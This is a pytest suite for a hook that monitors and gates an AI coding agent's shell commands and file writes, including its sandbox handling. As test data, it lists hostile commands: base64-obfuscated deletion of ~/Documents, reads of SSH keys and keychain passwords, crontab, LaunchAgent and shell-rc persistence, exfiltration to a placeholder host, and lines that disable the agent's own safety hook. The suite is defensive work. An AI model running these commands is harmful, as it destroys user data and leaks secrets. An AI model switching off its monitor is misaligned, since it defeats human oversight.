"""0.2.90 (client 0.2.58; FABLE-NOL 03.11 p.5; spec mandate-receipt-v0.1 6.5; QA 03.11 D6/D8/D12): the standing mandate.

The recommended form says `unlisted: "allow"`: every shell command runs with a receipt; the owner is asked at the four gates (G1 an
irreversible delete outside the project, G2 any non-loopback exit, G3 secrets, G4 persistence / the witness), at a file this agent wrote
and now runs (D8), and for a line the classifier cannot read. A write outside the project runs after the hook kept a shadow copy (D6);
a place of persistence is the danger `persist` (the hook refuses it outright). Marker `standing`: the legacy fixture (unlisted "ask") does
not apply here."""
import copy
import os

import pytest

from app.hookjudge import bashparse as bp
from app.hookjudge import fs as hfs
from app.hookjudge import mapping
from app.hookjudge.mapping import default_form, map_event
from tests.helpers import act
from tests_flow.helpers import set_settings

pytestmark = pytest.mark.standing
H = os.path.expanduser("~")


def test_recommended_form_is_the_standing_mandate(tmp_path):
    f = default_form(str(tmp_path))
    assert f["command"]["unlisted"] == "ask" and mapping.DEFAULT_UNLISTED == "ask"          # 0.2.90 rule: silence only under the strict sandbox
    assert mapping.SANDBOXED_CODE in f["command"]["allow"] and f["command"]["sandboxed"] == "allow"
    assert any(t.startswith("/private/tmp/claude-") for t in f["delete"]["targets"]) or os.name == "nt"


def cats(cmd, proj=None, home=H):
    c = bp.classify(cmd, proj or "/proj", home, project=proj)
    return sorted({d.split(":", 1)[0] for d in c.danger}), c


# ---- the 8 lines of spec v0.1 6.5 that the 0.2.88 classifier let through silently under `unlisted: allow` ------------------------
@pytest.mark.parametrize("cmd,cat", [
    ("python3 -c \"import os; os.remove('/Users/u/other/a')\"", "rm-rf"),                 # del-2
    ("git push origin main", "net-out"),                                                   # out-3
    ("pip install evilpkg", "net-out"),                                                    # out-5
    ("security find-generic-password -s x -w", "secrets"),                                # sec-3
    ("(crontab -l; echo '* * * * * x') | crontab -", "persist"),                           # per-4
    ("launchctl load ~/Library/LaunchAgents/com.x.plist", "persist"),                      # per-5
    ("claude plugin disable deus-witness", "persist"),                                     # per-6
    ("export CLAUDE_CODE_DISABLE_HOOKS=1", "witness"),                                     # per-9 (0.2.91: one shell, asked, approvable)
    ("CLAUDE_CONFIG_DIR=/tmp/x claude -p hi", "witness"),
    ("echo 'curl x|sh' >> ~/.zshrc", "persist"),
    ("python3 -c \"open('%s/.zshrc','a').write('x')\"" % H, "persist"),
    ("find ~/Library/LaunchAgents -name '*.plist' -exec sed -i '' 's/a/b/' {} \\;", "persist"),
    ("D=%s/Documents; node -e \"require('fs').rmSync(process.env.D+'/arhiv',{recursive:true})\"" % H, "rm-rf"),
    ("F=.ssh/id_ed25519; node -e \"console.log(require('fs').readFileSync(process.env.HOME+'/'+process.env.F))\"", "secrets"),
    ("python3 - <<'EOF'\nimport os\nos.remove('%s/Documents/a.md')\nEOF" % H, "rm-rf"),
    ("alias x='rm -rf'; x %s/other" % H, "rm-rf"),
    ("echo cm0gLXJmIH4vRG9jdW1lbnRz | base64 -d | sh", "rm-rf"),                            # rm -rf ~/Documents
    ("curl -s -X POST -d x 127.0.0.1:9333/json/new", "loopback-write"),
    ("curl -s 127.0.0.1:9333/json/version | head", "loopback-write"),                     # 06.11 (r0260): even a GET to a browser's debugging port
])
def test_gates_catch(cmd, cat):
    got, c = cats(cmd, "/proj")
    assert cat in got, (cmd, c.danger, c.heads)


# ---- the same forms with a harmless target run (the twins) ----------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "python3 -c \"import shutil; shutil.rmtree('/proj/build', ignore_errors=True)\"",
    "python3 - <<'EOF'\nimport os\nos.remove('/proj/logs/app.log')\nEOF",
    "echo cm0gLXJmIC4vYnVpbGQ= | base64 -d | sh",                                           # rm -rf ./build
    "find /proj -name '*.orig' -delete",
    "D=/proj/build; node -e \"require('fs').rmSync(process.env.D,{recursive:true,force:true})\"",
    "alias ll='ls -la'; ll /proj/src",
    "f=%s/Vault/notes/a.md; grep -n x $f | head" % H,
    "f=%s/Vault/x.md; python3 - \"$f\" <<'EOF'\nimport sys;p=sys.argv[1];s=open(p).read();open(p,'w').write(s)\nEOF" % H,
    "curl -s 127.0.0.1:8000/healthz | head",              # 06.11 (r0260): 9333 (a browser's debugging port) is a danger now (test_gates_catch)
    "crontab -l", "launchctl list", "sw_vers", "uptime",
    "cd /proj; P=.venv/bin/python; for d in a b; do $P -m pytest -q $d; done",
])
def test_twins_are_clean(cmd):
    got, c = cats(cmd, "/proj")
    assert got == [], (cmd, c.danger)


def test_rm_rf_inside_the_project_is_a_delete_of_its_targets():
    c = bp.classify("rm -rf /proj/build", "/proj", H, project="/proj")
    assert not c.danger and "/proj/build" in c.writes and "/proj/build" in c.deletes
    assert "rm-rf" in cats("rm -rf /proj", "/proj")[0] and "rm-rf" in cats("rm -rf /proj/.git", "/proj")[0]
    assert "rm-rf" in cats("rm -rf %s/other" % H, "/proj")[0]


# ---- on the server: writes outside the project (D6), persistence, the written file run (D8), one No binds one line (D12) ----------
class Dev:
    def __init__(self, client, owner, proj, home=None):
        self.c, self.proj, self.home = client, str(proj), home
        set_settings(client.app.state.ctx, owner.account["id"], max_pending=10000, max_defers_hour=100000)
        self.ag, self.hdr = owner.new_agent("claude-code", "cc")
        self.owner = owner
        m, r = owner.mandate(self.ag["id"], default_form(self.proj, home=home))
        assert r.status_code == 200, r.text

    def send(self, cmd, tool="Bash", inp=None):
        ev = {"tool_name": tool, "tool_input": inp if inp is not None else {"command": cmd}, "cwd": self.proj}
        env = {"CLAUDE_PROJECT_DIR": self.proj, "HOME": self.home or H, "DEUS_WITNESS_EXEC_SCAN": "0"}
        out = []
        for m in map_event(ev, home=self.home or H, env=env):
            r = act(self.c, self.hdr, m.tool, m.args).json()
            out.append((m.tool, r))
            if r.get("verdict") == "deny":
                break
        return out


@pytest.fixture
def dev(client, owner, tmp_path):
    home = tmp_path / "home"
    proj = home / "proj"
    (proj / "src").mkdir(parents=True)
    (home / "Vault").mkdir()
    (home / "Vault" / "note.md").write_text("old\n")
    return Dev(client, owner, proj.resolve(), home=str(home.resolve()))


def test_unlisted_command_is_asked_without_the_fact_and_sandboxed_with_it(dev, monkeypatch):
    got = dev.send("sw_vers; uptime; python3 src/app.py")
    assert [(r["verdict"], r["reason"]) for _, r in got] == [("defer", "ESCALATE_COMMAND")], got     # as 0.2.57: a question with a button
    f = copy.deepcopy(STRICT); f["deny_read"] = [dev.home, "/nonexistent-home"]
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", f)
    got = dev.send("sw_vers; uptime; python3 src/app.py ")
    assert [(r["verdict"], r["reason"]) for _, r in got] == [("allow", "OK_SANDBOXED")], got      # the sandbox buys the silence


def test_write_outside_the_project_runs_after_a_shadow_copy(dev):
    note = os.path.join(dev.home, "Vault", "note.md")
    got = dev.send("echo hi >> %s" % note)
    tools = [t for t, _ in got]
    assert "Bash.write" not in tools and [(r["verdict"], r["reason"]) for _, r in got] == [("defer", "ESCALATE_COMMAND")], got   # a button, not RESOURCE
    w = [m for m in map_event({"tool_name": "Bash", "tool_input": {"command": "echo hi >> " + note}, "cwd": dev.proj}, home=dev.home,
                              env={"CLAUDE_PROJECT_DIR": dev.proj, "HOME": dev.home, "DEUS_WITNESS_EXEC_SCAN": "0"})]
    wit = w[-1].args["_witness"]
    assert wit["outside_writes"] == [note] and len(wit["shadow"][note]) == 64 and any(h.startswith(mapping.OUTSIDE_WRITE) for h in wit["commands"])
    # the file tools too
    got = dev.send(None, tool="Write", inp={"file_path": note, "content": "new\n"})
    assert got[0][0] == "Write.outside" and (got[0][1]["verdict"], got[0][1]["reason"]) == ("defer", "ESCALATE_COMMAND"), got


def test_write_outside_without_a_shadow_copy_is_asked(dev, monkeypatch):
    note = os.path.join(dev.home, "Vault", "note.md")
    monkeypatch.setattr(hfs.LocalFS, "shadow", lambda self, p: {"failed": "disk full"})
    got = dev.send("echo hi >> %s" % note)
    assert got[0][0] == "Bash.danger" and got[0][1]["verdict"] == "defer", got
    got = dev.send(None, tool="Edit", inp={"file_path": note, "old_string": "old", "new_string": "new"})
    assert got[0][0] == "Write.danger" and got[0][1]["verdict"] == "defer", got


def test_persistence_place_is_the_danger_persist(dev):
    # 06.11 (Constitution v1, Н3/Н4): the danger `persist` is refused outright by the witness now (before: a question the hook refused
    # anyway, PERSIST_PLACE) -- stricter: no question, nobody notified, the agent reads why
    rc = os.path.join(dev.home, ".zshrc")
    got = dev.send("echo 'alias ls=ls' >> %s" % rc)
    assert got[0][0] == "Bash.danger" and (got[0][1]["verdict"], got[0][1]["reason"]) == ("deny", "FORBIDDEN_AUTOSTART"), got
    assert "persist:" in got[0][1]["action"]["recipient"], got
    got = dev.send(None, tool="Write", inp={"file_path": os.path.join(dev.home, ".claude", "settings.json"), "content": "{}"})
    assert got[0][0] == "Write.danger" and (got[0][1]["verdict"], got[0][1]["reason"]) == ("deny", "FORBIDDEN_AUTOSTART"), got


def test_d8_written_code_file_run_is_held_once_a_clean_twin_runs(dev):
    tool = os.path.join(dev.proj, "src", "tool.py")
    w = dev.send(None, tool="Write", inp={"file_path": tool, "content": "import shutil, os\nshutil.rmtree(os.path.expanduser('~/Documents'), ignore_errors=True)\n"})
    assert w[0][1]["verdict"] == "allow"
    got = dev.send("python3 src/tool.py")
    # r0354 («одно действие = один вердикт»): the written text wipes ~/Documents -- its run is refused as the same text typed (Н5);
    # before: a question (0.2.57)
    assert got[-1][1]["verdict"] == "deny" and got[-1][1]["reason"] == "FORBIDDEN_WIPE", got
    clean = os.path.join(dev.proj, "src", "clean.py")
    dev.send(None, tool="Write", inp={"file_path": clean, "content": "print('hi')\n"})
    got = dev.send("python3 src/clean.py")
    assert got[-1][1]["verdict"] == "defer", got


def test_d8_twin_files_the_agent_did_not_write_run(client, owner, tmp_path):
    home = tmp_path / "home2"
    proj = home / "proj"
    (proj / "src").mkdir(parents=True)
    (proj / "src" / "app.py").write_text("print(1)\n")
    d = Dev(client, owner, proj.resolve(), home=str(home.resolve()))
    for cmd in ("python3 src/app.py", "bash -c 'echo ok'", "node src/index.js"):
        got = d.send(cmd)
        assert all(r["reason"] in ("ESCALATE_COMMAND", "OK") for _, r in got), (cmd, got)      # never held, never RESOURCE


def test_d12_one_no_binds_the_exact_line_not_every_gh(dev):
    """QA D12: one No to `gh pr list` refused every gh line for an hour (the recipient of a Bash part is the program's danger / name)."""
    got = dev.send("gh pr list")
    rid = next(r["rid"] for t, r in got if t == "Bash.danger")
    assert dev.owner.approve(rid, approved=False).status_code == 200
    again = dev.send("gh pr list")
    assert any(r.get("reason") == "REFUSED" for _, r in again), again
    other = dev.send("gh pr view 1")
    assert not any(r.get("reason") == "REFUSED" for _, r in other) and other[0][1]["verdict"] == "defer", other


def test_egress_without_a_message_class_is_held(client, owner, tmp_path):
    proj = tmp_path / "p3"
    proj.mkdir()
    set_settings(client.app.state.ctx, owner.account["id"], max_pending=10000, max_defers_hour=100000)
    ag, hdr = owner.new_agent("claude-code", "cc")
    f = default_form(str(proj.resolve()))
    f.pop("message")
    m, r = owner.mandate(ag["id"], f)
    assert r.status_code == 200, r.text
    r = act(client, hdr, "Bash.net", {"command": "curl https://x.example/", "_witness": {"cwd": str(proj), "danger": [], "writes": [], "net": ["webfetch@x.example"], "commands": ["curl"]}}).json()
    assert r["status"] == "held" and r["reason"] == "ESCALATE_EGRESS_UNSPECIFIED", r
    r = act(client, hdr, "Bash.net", {"command": "curl 127.0.0.1/", "_witness": {"cwd": str(proj), "danger": [], "writes": [], "net": ["webfetch@127.0.0.1"], "commands": ["curl"]}}).json()
    assert r["verdict"] == "allow" and r["status"] == "allowed", r


# ---- D8 under the strict sandbox (19:40 03.11): a written file runs without a hold when the OS sandbox holds the call ------------------
STRICT = {"v": 1, "platform": "darwin", "sources": {"user": "ok", "project": "absent", "local": "absent"},
          "enabled": True, "fail_if_unavailable": True, "allow_unsandboxed": False, "excluded": [], "ignore_violations": False,
          "fs_disabled": None, "deny_read": [H, "/nonexistent-home"], "allow_read": [], "domains": [], "unix_sockets": [],
          "all_unix_sockets": None, "mach_lookup": [], "local_binding": None, "weaker": [], "env_scrub": True, "disable_flag": False,
          "env_files": [], "strict_allowlist": True, "managed_domains_only": False, "permission_mode": "default",
          "settings_digest": "ab" * 32, "since_start": [], "doubt": []}


def test_d8_written_file_runs_unheld_in_the_strict_sandbox_held_outside(client, owner, tmp_path, monkeypatch):
    home = tmp_path / "home3"
    proj = home / "proj"
    (proj / "src").mkdir(parents=True)
    d = Dev(client, owner, proj.resolve(), home=str(home.resolve()))
    f = copy.deepcopy(STRICT)
    f["deny_read"] = [str(home.resolve()), "/nonexistent-home"]
    tool = os.path.join(d.proj, "src", "tool.py")
    # 04.11: the written text reaches no gate (a delete outside the project, an exit, secrets, persistence): contained by the OS
    assert d.send(None, tool="Write", inp={"file_path": tool, "content": "import json\nprint(json.dumps({'ok': 1}))\n"})[0][1]["verdict"] == "allow"
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", f)
    got = d.send("python3 src/tool.py")
    assert [(r["verdict"], r["reason"], r["status"]) for _, r in got] == [("allow", "OK_SANDBOXED", "allowed")], got   # contained: no hold, a receipt
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", None)
    got = d.send("python3 src/tool.py ")
    assert got[-1][1]["verdict"] == "defer" and got[-1][1]["reason"] in ("ESCALATE_WRITTEN_RUN", "ESCALATE_COMMAND"), got   # outside: a question
    # a line that leaves the sandbox is still asked under the fact (G2): the sandbox does not cover an exit
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", f)
    got = d.send("python3 src/tool.py && git push origin main")
    assert any(r["verdict"] == "defer" for _, r in got), got


# ---- QA 03.11 (0e4f6f9) Н1-Н8: without the fact every line is a question; with it the sandbox bounds what runs (L2: the fact is emulated)
QA_LINES = {
    "sh < cmds.txt": True, "python3 notes.txt": True, "python3 -c \"exec(open('data.json').read())\"": True,
    "chmod +x tool.txt && ./tool.txt": True, "python3 %s/bin/tool.py" % H: True, "./del -rf %s/Documents" % H: True,   # Н2: the OS bounds a script outside the project too
    "ln -sf %s/Documents ./docs && rm -rf ./docs/" % H: True,     # r0261 (closed list): the delete lands in ~/Documents -> EPERM from
    #                                                                the kernel (Seatbelt checks the real path); was asked
    "ditto x %s/Library/LaunchAgents/x.plist" % H: False,
    "openssl s_client -connect h.example:443": True,       # r0261: a network read, refused by the kernel (was asked)
    "git -c alias.x=push x": False, "echo x | xargs git push": False,
    "git send-pack origin main": False, "python3 -m deus_witness.hook.main --undo-strict": False, "uvx --from deus-witness deus-witness try --force": False,
}


def _asked(got):
    """the hook runs a line only when EVERY part is allowed; one question / refusal decides it"""
    return bool(got) and any(r["verdict"] != "allow" for _, r in got)


def test_qa_lines_asked_without_the_fact(dev):
    for cmd in QA_LINES:
        assert _asked(dev.send(cmd)), cmd


def test_qa_lines_under_the_fact_only_contained_ones_run(dev, monkeypatch):
    f = copy.deepcopy(STRICT); f["deny_read"] = [dev.home, "/nonexistent-home"]
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", f)
    for cmd, contained in QA_LINES.items():
        got = dev.send(cmd + " ")
        if contained:
            assert not _asked(got) and any(r["reason"] == "OK_SANDBOXED" for _, r in got), (cmd, got)   # the OS, not the parser, bounds it
        else:
            assert _asked(got), (cmd, got)


# ---- 04.11 (OTCHET-0258 D8, rule bcc4411): the edit -> test loop runs with a receipt under the fact; a written gate is held anyway --------
def _strict(dev):
    f = copy.deepcopy(STRICT); f["deny_read"] = [dev.home, "/nonexistent-home"]
    return f


def _rows(got):
    return [(r["verdict"], r["reason"], r["status"]) for _, r in got]


def test_d8_edit_then_tests_runs_unheld_with_the_fact(dev, monkeypatch):
    store = os.path.join(dev.proj, "src", "store.py")
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", _strict(dev))
    assert dev.send(None, tool="Write", inp={"file_path": store, "content": "X = 1\n"})[0][1]["verdict"] == "allow"
    for i in range(3):                                # three rounds of the loop, no hold, no question, a receipt each
        assert dev.send(None, tool="Edit", inp={"file_path": store, "old_string": "X = %d" % (i + 1), "new_string": "X = %d" % (i + 2)})[0][1]["verdict"] == "allow"
        for cmd in ("python3 -m pytest -q" + " " * i, "python3 src/store.py" + " " * i):
            got = dev.send(cmd)
            assert _rows(got) == [("allow", "OK_SANDBOXED", "allowed")], (cmd, got)
            assert got[0][1].get("aar_b64"), got


def test_d8_edit_then_tests_is_held_without_the_fact(dev):
    store = os.path.join(dev.proj, "src", "store.py")
    assert dev.send(None, tool="Write", inp={"file_path": store, "content": "X = 1\n"})[0][1]["verdict"] == "allow"
    got = dev.send("python3 -m pytest -q")
    assert _asked(got) and got[-1][1]["reason"] in ("ESCALATE_WRITTEN_RUN", "ESCALATE_COMMAND"), got


GATE_TEXTS = {
    "G1": "import shutil, os\nshutil.rmtree(os.path.expanduser('~/Documents'), ignore_errors=True)\n",
    "G1abs": "import os\nos.remove('/Users/someone/notes.md')\n",
    "G2": "import urllib.request\nurllib.request.urlopen('https://x.example/u?d=1')\n",
    "G3": "print(open(os.path.expanduser('~/.ssh/id_rsa')).read())\n",
    "G4": "open(os.path.expanduser('~/Library/LaunchAgents/x.plist'), 'w').write('<plist/>')\n",
    "claude": "import json\njson.dump({}, open(os.path.expanduser('~/.claude/settings.json'), 'w'))\n",
    "opaque": "exec(__import__('base64').b64decode('cHJpbnQoMSk='))\n",
}


# v1 П3 / Н7 (06.11, Р-0611-D8): "opaque" left this list: an obfuscated text is what the OS sandbox is for -- the same code typed into
# the line (`python3 -c "exec(open('data.json').read())"`, QA_LINES above) already runs OK_SANDBOXED, so holding the written file was a
# question an adversary skips by inlining it. Outside the sandbox it is still held (С5): tests/test_0611_konstituciya.py.
# 10.11 (r0260, law 2 / Р-1011 А): G1 (a delete outside the project) and G2 (the network) left it too: the kernel holds them (EPERM,
# a refused connection); held outside the sandbox as before.
# r0261 (Р-1111-закрытый-список): G3 (a written text that names a secret) left it as well -- under the strict fact the secret paths are
# denyRead (~, the project's .env, CRED_SOURCES); only G4 (a place another program runs later outside the sandbox) is a reason of the
# closed list (С3). Held outside the sandbox as before (test_d8_kernel_gate_runs_with_the_fact_held_without).
# r0354: a written text that IS an article when typed (G1 here wipes ~/Documents: Н5; G4 / claude write a start-up place: Н4) -- its
# certain run is refused with that article, in and out of the sandbox (the hold / release mechanics: the other kinds)
WRITTEN_ARTICLE = {"G1": "FORBIDDEN_WIPE", "G4": "FORBIDDEN_AUTOSTART", "claude": "FORBIDDEN_AUTOSTART"}
VISIBLE_GATES = sorted(k for k in GATE_TEXTS if k not in ("opaque", "G1", "G1abs", "G2", "G3"))
KERNEL_GATES = sorted(k for k in GATE_TEXTS if k in ("G1", "G1abs", "G2", "G3"))


@pytest.mark.parametrize("kind", VISIBLE_GATES)
def test_d8_written_gate_is_held_even_with_the_fact(dev, monkeypatch, kind):
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", _strict(dev))
    p = os.path.join(dev.proj, "src", "g_%s.py" % kind)
    assert dev.send(None, tool="Write", inp={"file_path": p, "content": "import os\n" + GATE_TEXTS[kind]})[0][1]["verdict"] == "allow"
    got = dev.send("python3 src/g_%s.py" % kind)
    if kind in WRITTEN_ARTICLE:
        # r0354: the file's text writes a start-up place (Н4): its certain run is refused as the same text typed
        assert got[-1][1]["verdict"] == "deny" and got[-1][1]["reason"] == WRITTEN_ARTICLE[kind], (kind, got)
    else:
        assert _asked(got) and got[-1][1]["reason"] == "ESCALATE_WRITTEN_RUN" and got[-1][1]["status"] == "held", (kind, got)
    assert dev.send("python3 -m pytest -q")[-1][1]["reason"] == "ESCALATE_WRITTEN_RUN"   # any run of code, not only the file's own name


@pytest.mark.parametrize("kind", KERNEL_GATES)
def test_d8_kernel_gate_runs_with_the_fact_held_without(dev, monkeypatch, kind):
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", _strict(dev))
    p = os.path.join(dev.proj, "src", "k_%s.py" % kind)
    assert dev.send(None, tool="Write", inp={"file_path": p, "content": "import os\n" + GATE_TEXTS[kind]})[0][1]["verdict"] == "allow"
    PRED = [("allow", "OK_SANDBOXED", "allowed")] if kind not in WRITTEN_ARTICLE else [("deny", WRITTEN_ARTICLE[kind], "denied")]
    assert _rows(dev.send("python3 src/k_%s.py" % kind)) == PRED, kind      # r0354: an article is never covered by the sandbox
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", None)
    got = dev.send("python3 src/k_%s.py " % kind)
    PRED = True
    assert _asked(got) is PRED, (kind, got)


def test_d8_gate_survives_a_harmless_edit_and_goes_with_a_whole_clean_write(dev, monkeypatch):
    monkeypatch.setattr(hfs, "LOCAL_SANDBOX", _strict(dev))
    p = os.path.join(dev.proj, "src", "t.py")
    dev.send(None, tool="Write", inp={"file_path": p, "content": "import os\n" + GATE_TEXTS["G4"] + "X = 1\n"})   # r0261: G4 (was G3)
    dev.send(None, tool="Edit", inp={"file_path": p, "old_string": "X = 1", "new_string": "X = 2"})
    got = dev.send("python3 src/t.py")
    assert got[-1][1]["reason"] == "ESCALATE_WRITTEN_RUN", got       # the rest of the file is unknown to the Edit: the gate stays
    dev.send(None, tool="Write", inp={"file_path": p, "content": "print('clean')\n"})
    got = dev.send("python3 src/t.py ")
    assert _rows(got) == [("allow", "OK_SANDBOXED", "allowed")], got


def test_gate_text_twins():
    from app import execguard as eg
    proj = "/Users/x/proj"
    assert eg.gate_text("import os\nos.remove('/Users/x/proj/build/a.o')\n", proj) is None      # a delete inside the project
    assert eg.gate_text("import shutil\nshutil.rmtree('/tmp/cache')\n", proj) is None          # the temp directory
    assert eg.gate_text("print('hello')\n", proj) is None
    assert eg.gate_text("import requests\nrequests.get('http://127.0.0.1:8000/')\n", proj) is None
    assert eg.gate_text(None, proj) == "unseen"
    assert eg.gate_text("subprocess.run(['crontab', '-l'])\n", proj) == "G4"
